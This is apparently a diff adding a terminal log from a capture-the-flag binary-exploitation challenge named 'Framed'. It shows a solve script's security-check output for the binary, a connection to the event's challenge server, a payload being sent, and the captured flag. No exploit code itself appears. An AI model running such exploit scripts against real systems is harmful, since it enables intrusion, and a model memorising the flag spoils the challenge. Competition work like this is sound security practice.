@@ -1,0 +1,11 @@
+mito@ubuntu:~/CTF/OMH_2021_CTF/Pwn_Framed/framed/for_players$ python solve.py r
+[*] '/home/mito/CTF/OMH_2021_CTF/Pwn_Framed/framed/for_players/framed'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to framed.zajebistyc.tf on port 17005: Done
+[*] Switching to interactive mode
+Read 58 payload bytes
+flat{uninitialized_variables_are_not_really_uninitialized}
